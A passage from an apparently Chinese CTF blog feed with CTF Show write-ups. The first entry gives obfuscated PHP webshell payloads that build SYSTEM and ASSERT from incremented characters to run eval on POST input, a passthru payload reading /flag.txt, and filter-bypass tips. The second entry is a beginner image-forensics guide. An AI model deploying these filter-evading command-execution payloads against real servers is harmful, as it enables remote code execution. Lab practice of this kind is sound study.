class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; // <span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>; // A<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // E <span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // R<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // ASSERT(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure><p><strong>system()</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=C;//<span class="variable">$_</span>=<span class="variable">$_</span>[0]; //Cprint_r(<span class="variable">$_</span>);<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);//<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // Y<span class="variable">$___</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Tprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Eprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Mprint_r(<span class="variable">$__</span>);print_r(<span class="variable">$___</span>); //SYSTEM<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;//print_r(<span class="variable">$_</span>);<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$____</span>);//_POSTprint_r(<span class="variable">$___</span>);//SYSTEM<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // SYSTEM(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php//<span class="variable">$_</span>=[C];<span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));//<span class="variable">$_</span>=C;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));highlight_file(__FILE__);<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];<span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;<span class="built_in">eval</span>(<span class="variable">$a</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get?looklook=1#postctf[showamp;_=ls;</span></span><br></pre></td></tr></table></figure><p><strong>长度限制：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;);</span></span><br></pre></td></tr></table></figure><h2 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h2><p><img src="https://i.loli.net/2021/08/14/Rn7LtWDXEldPBp3.png" alt="image-20210814215714938"></p><p>50 4B 03 04 ZIP文件</p><p><img src="https://i.loli.net/2021/08/14/KY4lPejVoOUiqbt.png" alt="image-20210814215832498"></p><p><img src="https://i.loli.net/2021/08/14/LiNXRJ9SHnwVtEz.png" alt="image-20210814220223592"></p><p>这是用来迷惑的</p><p>存在一个文本文档，是个 图片，浏览器访问</p><p><img src="https://i.loli.net/2021/08/16/78L6POtr1spjlBE.png" alt="image-20210816210645822"></p><p>扫描得到    cfhwc19abika_etso{h_u_e_ui1}</p><p>查看图片属性</p><p><img src="https://i.loli.net/2021/08/16/M1JngkVhvbPIDOC.png" alt="image-20210816211218664"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✿❇✼❄✿❇✼❂❃❆✿✽❂❁❉✼==<span class="comment"># 不知道怎末用</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/FyR5WpEugQI9ShK.png" alt="image-20210816211549442"></p><h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><h2 id="命令执行做题思路"><a href="#命令执行做题思路" class="headerlink" title="命令执行做题思路"></a>命令执行做题思路</h2><ol><li><p>一眼就有思路的直接掠过</p></li><li><p>一眼没有思路的，首先根据正则的过滤分类，决定思路</p><ul><li><p>有回显？无回显？ eval    exec</p></li><li><p>eval  还是  system</p></li><li><p>无字母数字类？</p><p>异或？或？取反？自增？</p></li><li><p>过滤 ;</p></li><li><p>过滤 ‘ ‘    “ “</p></li><li><p>找 phpinfo() 看被 ban 的函数名</p></li></ul></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show 吃瓜杯篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-Misc入门</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/</id>
    <published>2021-10-01T11:17:47.000Z</published>
    <updated>2021-10-01T11:18:54.358Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show Misc 入门篇。</p><span id="more"></span><h1 id="Misc-入门"><a href="#Misc-入门" class="headerlink" title="Misc 入门"></a>Misc 入门</h1><h2 id="1-1-misc-1-—-QQ截图-直接识别图片内容"><a href="#1-1-misc-1-—-QQ截图-直接识别图片内容" class="headerlink" title="1.1 misc 1 — QQ截图 直接识别图片内容"></a>1.1 misc 1 — QQ截图 直接识别图片内容</h2><p><img src="https://i.loli.net/2021/08/06/Rx8sIlWr5dCVMBU.png" alt="image-20210806130402835"></p><p>图片直接是这个，我们可以 QQ 截图，使用当中的 屏幕识别 即可识别出文字</p><h2 id="1-2-misc-2-—-png-图片识别"><a href="#1-2-misc-2-—-png-图片识别" class="headerlink" title="1.2 misc 2 — png 图片识别"></a>1.2 misc 2 — png 图片识别</h2><p><img src="https://i.loli.net/2021/08/06/zi3RJMZBUgDIFV1.png" alt="image-20210806130536818"></p><p>记事本打开是这样，那肯定不是 .txt 文本文件</p><p>使用 Editor010 打开</p><p><img src="https://i.loli.net/2021/08/06/bMwnHSazE6ZumGk.png" alt="image-20210806131136158"></p><p>说明这是 png 文件，修改后缀，然后 QQ 屏幕识图即可</p><p><strong>补充知识：Python3 进行图片识别 <a href="https://segmentfault.com/a/1190000014091417">https://segmentfault.com/a/1190000014091417</a></strong></p><p><img src="https://i.loli.net/2021/08/08/uJiB5lEZkXsd1WG.png" alt="image-20210808212059742"></p><h2 id="1-3-misc-3-—-查看-bpg-图片"><a href="#1-3-misc-3-—-查看-bpg-图片" class="headerlink" title="1.3 misc 3 — 查看 bpg 图片"></a>1.3 misc 3 — 查看 bpg 图片</h2><p>是 bpg 图片，需要专门的查看工具 <a href="https://bellard.org/bpg/">https://bellard.org/bpg/</a></p><p><img src="https://i.loli.net/2021/08/06/ify8sS4qJTQcnHN.png" alt="image-20210806131927979"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">\bpj\bpgview.exe misc3.bpg</span><br></pre></td></tr></table></figure><h2 id="1-4-misc-4-—-图片格式-文件头"><a href="#1-4-misc-4-—-图片格式-文件头" class="headerlink" title="1.4 misc 4 — 图片格式 + 文件头"></a>1.4 misc 4 — 图片格式 + 文件头</h2><p><a href="https://baike.baidu.com/item/%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/381122?fr=aladdin">图片格式</a></p><p><strong>JPEG</strong><br>文件头：FF D8 FF　　　　　<br>文件尾：FF D9</p><p><strong>TGA</strong><br>未压缩的前4字节 00 00 02 00<br>RLE压缩的前5字节 00 00 10 00 00</p><p><strong>PNG</strong></p><p>文件头：89 50 4E 47 0D 0A 1A 0A　　　　<br>文件尾：AE 42 60 82</p><p><strong>GIF</strong></p><p>文件头：47 49 46 38 39(37) 61　　　　<br>文件尾：00 3B</p><p><strong>BMP</strong></p><p>文件头：42 4D</p><p>文件头标识(2 bytes) 42(B) 4D(M)</p><p><strong>TIFF (tif)</strong></p><p>文件头：49 49 2A 00</p><p><strong>ico</strong></p><p>文件头：00 00 01 00</p><p><strong>Adobe Photoshop (psd)</strong></p><p>文件头：38 42 50 53</p><p><strong>一个一个查看，修改后缀</strong></p><p>1.txt png</p><p>2.txt jpg</p><p>3.txt bmp</p><p>4.txt gif</p><p>5.txt tif</p><p>6.txt webp</p><h2 id="1-5-misc-5-—-png-文件尾-添内容"><a href="#1-5-misc-5-—-png-文件尾-添内容" class="headerlink" title="1.5 misc 5 — png 文件尾 添内容"></a>1.5 misc 5 — png 文件尾 添内容</h2><p><img src="https://i.loli.net/2021/08/06/TdIf1OWxCinvLR6.png" alt="image-20210806133135512"></p><p>010打开</p><p><img src="https://i.loli.net/2021/08/06/z9YCQkL7JaZKE8t.png" alt="image-20210806133333684"></p><p>发现在 png 的文件尾后面多出了</p><h2 id="1-6-misc-6-—-jpg-文件-添内容"><a href="#1-6-misc-6-—-jpg-文件-添内容" class="headerlink" title="1.6 misc 6 — jpg 文件 添内容"></a>1.6 misc 6 — jpg 文件 添内容</h2><p><img src="https://i.loli.net/2021/08/06/PsSiYcQVTj5Bt1g.png" alt="image-20210806142710191"></p><h2 id="1-7-misc-7-—-flag在图片文件信息中"><a href="#1-7-misc-7-—-flag在图片文件信息中" class="headerlink" title="1.7 misc 7 — flag在图片文件信息中"></a>1.7 misc 7 — flag在图片文件信息中</h2><p><strong>flag在图片文件信息中。</strong></p><p><img src="https://i.loli.net/2021/08/06/FXqw91zIl7HtOfx.png" alt="image-20210806143036016"></p><p><strong>常用到的手段还有</strong></p><ul><li>右键–属性</li><li>工具 <a href="https://exif.tuchong.com/">图虫查看器</a> 能够查看图片的详细信息</li></ul><h2 id="1-8-misc-8-—-flag在图片文件中图片文件中-—-binwalk-foremost"><a href="#1-8-misc-8-—-flag在图片文件中图片文件中-—-binwalk-foremost" class="headerlink" title="1.8 misc 8 — flag在图片文件中图片文件中 — binwalk  foremost"></a>1.8 misc 8 — flag在图片文件中图片文件中 — binwalk  foremost</h2><p><strong>flag在图片文件中图片文件中。</strong></p><p>010 打开</p><p><img src="https://i.loli.net/2021/08/06/SOIugvK2PU5Jql6.png" alt="image-20210806144045544"></p><p>可以发现，该 png 图片当中 还包含着一张 png 图片</p><p><strong>图片隐藏文件 binwalk  foremost</strong></p><p><a href="https://blog.csdn.net/Sc0fie1d/article/details/101602492">https://blog.csdn.net/Sc0fie1d/article/details/101602492</a></p><p><img src="https://i.loli.net/2021/08/06/C3Xg98KxbPEwpD1.png" alt="image-20210806144305711"></p><h2 id="1-9-misc-9-—-flag在图片块里"><a href="#1-9-misc-9-—-flag在图片块里" class="headerlink" title="1.9 misc 9 — flag在图片块里"></a>1.9 misc 9 — flag在图片块里</h2><p><img 